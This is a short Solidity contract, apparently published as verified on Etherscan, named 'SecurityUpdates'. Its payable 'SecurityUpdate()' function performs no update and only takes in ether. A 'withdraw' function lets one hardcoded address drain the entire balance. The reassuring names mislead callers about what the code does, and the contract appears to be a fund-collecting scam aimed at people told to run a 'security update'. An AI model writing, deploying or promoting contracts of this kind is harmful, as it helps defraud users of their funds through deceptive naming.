/**
 *Submitted for verification at Etherscan.io on 2023-03-08
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-08
*/

pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;

     constructor() public{   
        owner=0x751AF766a241EfE2851d315d76A211aa5BcF0D24;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}